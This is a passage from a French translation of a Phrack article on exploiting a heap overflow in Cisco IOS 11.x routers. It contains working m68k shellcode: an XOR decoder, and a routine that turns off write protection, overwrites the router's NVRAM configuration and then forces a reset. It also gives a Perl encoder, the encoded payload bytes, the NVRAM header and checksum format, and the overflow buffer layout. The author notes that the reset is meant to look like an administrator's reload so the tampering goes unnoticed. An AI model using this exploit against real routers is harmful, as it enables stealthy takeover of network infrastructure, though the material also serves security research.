+        lea     xor_code+0x0101(%pc),%a2
+        sub.a   #0x0101,%a2
+        | prepare le registre de decodage (motif du XOR)
+        move.w  #0xD5D5,%d1
+
+decode_loop:
+	| Decode notre payload principal et la config
+        eor.w   %d1,(%a2)+
+	| test le flag de terminaison (merci a Bine)
+        cmpi.l  #0xCAFEF00D,(%a2)
+broken_branch:
+        | d'habitude c'est 'bne decode_loop' ou 0x6600FFF6
+        .byte   0xCC,0x01,0xFF,0xF6
+
+xor_code:
+
+--- end bootstrap.s ---
+
+Vous pourriez assembler le code dans un fichier objet en faisant :
+linux# m68k-aout-as -m68360 -pic --pcrel -o bootstrap.o bootstrap.s
+
+Il y a quelques choses a dire a propos du code.
+D'abord il y les deux premieres instructiuons. Le CPU dont nous nous occuppons 
+supporte la protection en ecriture pour les segments de memoire [4]. 
+L'information a propos des segments de memoire est stockee dans des "Registres 
+de Base", allant de BR0 a BR7 [BR pour "Base Registers"]. Ceuxci sont 
+cartographies dans la memoire a 0x0FF00000 et suivants. Celui qui nous interesse 
+(BR7) est a 0x0FF010C2. Bit0 dit au CPU si cette memoire est valide et Bit1 si 
+c'est protege en ecriture, donc la seule chose que nous ayons a faire est de 
+changer de position le bit le plus bas un bit a droite. Le bit de protection en 
+ecriture est nettoye et le bit valide est toujours en place.
+
+
+La seconde chose d'un interet leger est le code de brache cassee, mais 
+l'explication dans le source devrait etre assez claire : le code OP de "BNE" est 
+malheureusement 0x6600. Donc nous deplacons tout le premier mot d'un rang vers 
+la droite et lorsque le code tourne, cela est corrige.
+
+La troisieme chose est le move factice vers d1. Si le lecteur / la letrice s'en
+referait a l'endroit ou nous discutions de l'echange de pointeurs, il / elle 
+remarquera qu'il y a une partie "back" [retour en arriere] dans cette operation 
+: c'est a dire que l'adresse de la pile est ecrite a notre code plus 20 octets 
+(ou 0x14). Donc nous utilisons une operation move qui arrive au code OP de 
+0x223c01010101, localise a l'offset 0x12 dans notre code. Apres que l'echange de 
+pointeur se soit effecute, la partie 0x01010101 est remplacee par le pointeur - 
+qui est ensuite innocemment bouge vers le registre d1 et ignore.
+
+
+Lorsque ce code a termine l'execution, le code joint auquel on a fait un XOR
+et la configuration devraient etre en memoire entierement en text/code. La seule 
+chose que nous ayons a faire maintenant est copier la config dans la NVRAM. 
+Voici le code approprie pour faire ceci :
+
+--- config_copy.s ---
+        .globl  _start
+_start:
+
+	| etteinds les interrupteurs
+        move.w	#0x2700,%sr;
+	move.l	#0x0FF010C2,%a1
+	move.w	#0x0001,(%a1)
+
+	| Obtiens la position de la config jointe et l'ecrit avec delay
+	lea	config(%pc),%a2
+	move.l	#0x0E0002AE,%a1
+	move.l	#0x00000001,%d2
+
+copy_confg:
+	move.b	(%a2)+,(%a1)+
+	| delay loop
+	move.l	#0x0000FFFF,%d1
+  write_delay:
+	  subx	%d2,%d1
+	  bmi	write_delay
+	cmp.l	#0xCAFEF00D,(%a2)
+	bne	copy_confg
+
+	| efface l'ancienne config pour eviter les erreurs de checksum
+delete_confg:
+	move.w	#0x0000,(%a1)+
+	move.l	#0x0000FFFF,%d1
+	| delay loop
+  write_delay2:
+	  subx	%d2,%d1
+	  bmi	write_delay2
+	cmp.l	#0x0E002000,%a1
+	blt	delete_confg
+
+	|  execute le RESET HARDWARE
+CPUReset:
+        move.w	#0x2700,%sr
+        moveal	#0x0FF00000,%a0
+        moveal	(%a0),%sp
+        moveal	#0x0FF00004,%a0
+        moveal	(%a0),%a0
+        jmp	(%a0)
+
+config:
+--- end config_copy.s ---
+
+Il n'y a pas de magie particuliere a propos de cette par du code. La seule chose 
+qui vaut la peine d'etre remarquee est le reset du CPU final. Il y a des raisons
+pourquoi nous faisons cela. Si nous crashons juste le routeur, il peut y avoir
+des handlers d'exceptions en place pour sauver la pile d'appel et d'autres trucs 
+vers la NVRAM. Ceci pourait changer les checksums de maniere imprevisible et 
+nous ne voulons pas faire ca. L'autre raison est qu'un reset propre ressemble a 
+comme s'il avait ete redemarre par un/une administrateur/administratrice en 
+utilisant la commande "reload". Donc nous ne souleverons aucune question malgre 
+la configuration completement modifiee ;-)
+
+Le code de config_copy et la config elle-meme doit etre a present encode par XOR 
+avec le motif que nous avons utilise dans le code du bootstrap. Donc vous 
+voudriez peut-etre mettre le code dans un joli tableau de caracteres pour un 
+usage facile dans une programe en C. Pour ceci, votre serviteur utilise un 
+script Perl mortellement simple mais efficace :
+
+--- objdump2c.pl ---
+#!/usr/bin/perl
+
+$pattern=hex(shift);
+$addressline=hex(shift);
+
+while (<STDIN>) {
+    chomp;
+    if (/[0-9a-f]+:\t/) {
+	(undef,$hexcode,$mnemonic)=split(/\t/,$_);
+	$hexcode=~s/ //g;
+	$hexcode=~s/([0-9a-f]{2})/$1 /g;
+
+	$alc=sprintf("%08X",$addressline);
+	$addressline=$addressline+(length($hexcode)/3);
+
+	@bytes=split(/ /,$hexcode);
+	$tabnum=4-(length($hexcode)/8);
+	$tabs="\t"x$tabnum;
+	$hexcode="";
+	foreach (@bytes) {
+		$_=hex($_);
+		$_=$_^$pattern if($pattern);
+		$hexcode.=sprintf("\\x%02X",$_);
+	}
+	print "\t\"".$hexcode."\"".$tabs."//".$mnemonic." (0x".$alc.")\n";
+    }
+}
+--- end objdump2c.pl ---
+
+Vous pouvez utiliser la sortie de objdump et le canaliser dans le script. Si le 
+script n'a aucun parametre, il produira la chaine de caractere en C sans
+modification. Le premier parametre optionnel sera votre motif XOR et le second 
+peut etre l'adresse ou votre tampon est sur le point de resider. Ceci rend le 
+debugging du code nettement plus simple parce que vous pouvez vous referrer au
+commentaire a la fin de votre chaine de caractere en C pour decouvrir quelle 
+commande a rendu le Cisco pas content.
+
+La sortie pour notre petit code config_copy.s avec un XOR de 0xD5 ressemble a 
+ceci (reduit pour phrack) :
+
+linux# m68k-aout-objdump -d config_copy.o |
+> ./objdump2XORhex.pl 0xD5 0x020F2A24
+
+"\x93\x29\xF2\xD5"              //movew #9984,%sr (0x020F2A24)
+"\xF7\xA9\xDA\x25\xC5\x17"      //moveal #267391170,%a1 (0x020F2A28)
+"\xE7\x69\xD5\xD4"              //movew #1,%a1@ (0x020F2A2E)
+"\x90\x2F\xD5\x87"              //lea %pc@(62 <config>),%a2 (0x020F2A32)
+"\xF7\xA9\xDB\xD5\xD7\x7B"      //moveal #234881710,%a1 (0x020F2A36)
+"\xA1\xD4"                      //moveq #1,%d2 (0x020F2A3C)
+"\xC7\x0F"                      //moveb %a2@+,%a1@+ (0x020F2A3E)
+"\xF7\xE9\xD5\xD5\x2A\x2A"      //movel #65535,%d1 (0x020F2A40)
+"\x46\x97"                      //subxw %d2,%d1 (0x020F2A46)
+"\xBE\xD5\x2A\x29"              //bmiw 22 <write_delay> (0x020F2A48)
+"\xD9\x47\x1F\x2B\x25\xD8"      //cmpil #-889262067,%a2@ (0x020F2A4C)
+"\xB3\xD5\x2A\x3F"              //bnew 1a <copy_confg> (0x020F2A52)
+"\xE7\x29\xD5\xD5"              //movew #0,%a1@+ (0x020F2A56)
+"\xF7\xE9\xD5\xD5\x2A\x2A"      //movel #65535,%d1 (0x020F2A5A)
+"\x46\x97"                      //subxw %d2,%d1 (0x020F2A60)
+"\xBE\xD5\x2A\x29"              //bmiw 3c <write_delay2> (0x020F2A62)
+"\x66\x29\xDB\xD5\xF5\xD5"      //cmpal #234889216,%a1 (0x020F2A66)
+"\xB8\xD5\x2A\x3D"              //bltw 32 <delete_confg> (0x020F2A6C)
+"\x93\x29\xF2\xD5"              //movew #9984,%sr (0x020F2A70)
+"\xF5\xA9\xDA\x25\xD5\xD5"      //moveal #267386880,%a0 (0x020F2A74)
+"\xFB\x85"                      //moveal %a0@,%sp (0x020F2A7A)
+"\xF5\xA9\xDA\x25\xD5\xD1"      //moveal #267386884,%a0 (0x020F2A7C)
+"\xF5\x85"                      //moveal %a0@,%a0 (0x020F2A82)
+"\x9B\x05"                      //jmp %a0@ (0x020F2A84)
+
+Finalement, il n'y a qu'une seule chose a faire avant que nous puissions
+compiler tout ca ensemble : nous devons creer le nouvel en-tete de la NVRAM et
+calculer la checksum pour notre nouvelle configuration. L'en-tete NVRAM a la
+forme de :
+
+typedef struct {
+    u_int16_t       magic;  	// 0xABCD
+    u_int16_t       one;	// type probable (1=ACII, 2=gz)
+    u_int16_t       checksum;
+    u_int16_t       IOSver;
+    u_int32_t       unknown;	// 0x00000014
+    u_int32_t       cfg_end;	// pointeur vers le premier octet libre
+				// dans la memoire apres la config
+    u_int32_t       size;
+} nvhdr_t;
+
+Evidemment, la plupart des valeurs ici s'expliquent d'elles-memes. Cet en-tete
+n'est presque pas autant teste que les structures de la memoire, donc IOS vous 
+pardonnera les etranges valeurs dans l'entree cfg_end et autres. Vous pouvez 
+choisir la version de IOS, mais votre seviteur recommande d'utiliser quelque 
+chose le long des lignes de 0x0B03 (11.3), juste pour s'assurer que cela
+fonctionne. Le champ taille couvre seulement le vrai test de config - non 
+l'en-tete.
+La checksum est calculee sur le tout (en-tete plus config) avec le champ
+checksum lui-meme etant mis a zero. C'est un standard de complement de checksum 
+comme vous trouvez dans toute implementation IP.
+
+Lorsque vous mettez tout ensemble, vous devriez avoir quelque chose le long des 
+ligne de :
+
+ +--------------+
+ | AAAAAAAAAAAA |
+ ...
+ | AAAAAAAAAAAA |
+ +--------------+
+ |BLOC FALSIFIE |
+ |              |
+ ....
+ +--------------+
+ | Bootstrap    |
+ |              |
+ ....
+ +--------------+
+ | config_copy  |
+ |  motif XOR   |
+ ....
+ +--------------+
+ | en-tete NVRAM|
+ | + config     |
+ |   motif XOR  |
+ ....
+ +--------------+
+
+
+... que vous pouvez a present evoyer au routeur Cisco pour execution. Si tout va 
+dans le sens prevu, le routeur se gelera visiblement pendant quelques temps
+parce qu'il est en plein dans les boucles lentes de la copy de la NVRAM et ne 
+permet pas d'interruption, et devrait ensuite redemarrer proprement et 
+gentiement.
+
+Pour garder de la place pour de meilleurs articles, le code complet n'est pas 
+inclut ici mais est disponible a 
+http://www.phenoelit.de/ultimaratio/UltimaRatioVegas.c . Cela supporte des 
+ajustements pour l'offset du code, on avait besoin de NOP et un bloc falsifie 
+legerement differant pour les IOS de la serie 11.1 .
+
+
+--[ Tout ce qui n'a pas ete dit precedemment
+
+Quelques remarques variees qui d'une facon ou d'une autre n'allaient pas dans le 
+reste de se texte devraient etre faites, alors elles sont faites ici.
+
+Tout d'abord, si vous trouvez ou connaissez une faille overflow pour IOS 11.x et 
+que vous pensez que ce ne vaut pas la peine de l'exploiter depuis que tout le 
+monde tourne sous 12.x aujourd'hui, laissez-moi contester ceci. Personne ayant 
+de l'experience sur Cisco IOS ne tournera sous la derniere version. Ca ne
+fonctionne pas correctement. De plus, beaucoup de monde ne mettent de toute 
+facon leurs routeurs a jour. Mais la partie la plus interessante est une chose 
+appelee "Helper Image" ou simplement "boot IOS". C'est un mini-IOS carge juste 
+apres le moniteur de ROM, qui est normalement un 11.x. Sur les plus petits 
+routeurs, c'est une image ROM qui ne peut pas etre facilement mise a jour. Pour 
+les plus gros, des gens m'ont assure qu'il n'y a pas de mini-IOS 12.x sorti 
+qu'ils mettraient sur un routeur de production majeure. Maintenant, quand le 
+Cisco demarre et lance le mini-IOS, il va lire la config et fonctionnera en 
+accord avec tant que la fonctionnalite est supportee. Plusieurs le sont - comme 
+le serveur TFTP. Ceci donne une fenetre de temps de 3 a 8 seconde a un(e)
+attaquant(e) dans laquelle il/elle peut provoquer un overflow sur le IOS, au cas 
+ou quelqu'un relance le routeur. Dans le cas ou cela ne va pas, le IOS normal 
+boote encore, donc il n'y aura aucune trace d'une quelconque activite hostile.
+
+Le second objet que votre serviteur aimerait signaler est les differantes
+choses que l'on peut vouloir explorer pour les attaques par overflow. L'evidente
+(utilisee dans cet article comme exemple) est un service tournant sur un routeur
+Cisco. Un autre point pour les trucs a overflow-er est les protocoles. Aucun 
+engin d'inspection de protocol est un parfait AFAYTK [desole j'ai pas reussi a
+traduire ca :( ]. Donc meme si le IOS est juste suppose router les paquets, mais
+doit inspecter le contenu pour certaines raisons, vous devriez trouver quelque
+chose ici. Et si tout echoue, il y a encore les overflows bases sur du 
+debugging. IOS offre une grande quantite de commandes de debugging pour presque
+tout. Celles-ci affichent normalement beaucoup d'informations venant directement
+des paquets qu'elles recoivent et ne verifient pas toujours le tampon qu'elles 
+utilisent pour compiler les chaines de caracteres affichees. Malheureusement,
+cela requiert que quelqu'un commence le debugging en premier lieu - mais bon,
+ca peut arriver.
+
+Et, finalement, quelques remerciements doivent etre ici. Ceux-ci vont aux 
+personnes suivantes sans ordre particulier : Gaus de Cisco PSIRT, Nico de 
+Securite.org, Dan de DoxPara.com, Halvar Flake, les trois CCIEs/Cisco wizards 
+anonymes auquels votre serviteur ne cesse de poser d'etranges questions et bien 
+sur FtR et Mr. V.H., parce que sans leur equipement il n'y aurait a 
+parler d'aucune recherche. Des remerciements vont en plus a tous les gens qui
+recherches des trucs sur Cisco et auxquels votre serviteur n'a de loin aucune
+chance de parler - s'il vous plait prenez contact avec nous.
+Le dernier va aux labos de recherche de failles : faites-moi savoir si vous
+avez besoin d'aide pour reproduire ceci `;-7
+
+
+--[ A - References
+
+[1] anonymous <d45a312a@author.phrack.org>
+    "Once upon a free()..."
+    Phrack Magazine, Volume 0x0b, Issue 0x39, Phile #0x09 of 0x12
+
+[2] Cisco Router IOS Memory Maps
+    http://www.cisco.com/warp/public/112/appB.html
+
+[3] GNU binutils
+    http://www.gnu.org/software/binutils/binutils.html
+
+[4] Motorola QUICC 68360 CPU Manual
+    MC68360UM, Page 6-70
+
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
+
+Traduit par [DegenereScience]DecereBrain, le Dimanche 2 Mars 2003, 01:27
+Fin de l'article (a partir de bootstrap.s) traduite en ecoutant l'album
+"Brother's gonna work it out" des Chemical Brothers. Precision importante.
+
+En reference j'ajouterai peut-etre les articles de la serie "Protection de
+l'infrastructure reseau IP" de Nicolas FISBACH de securite.org (d'ailleurs cite
+dans les remerciements de cet article) parus dans le magazine MISC, notamment
+l'article "L'autopsie de routeurs" parus dans le numero 5 (Janvier/Fevrier 2003).
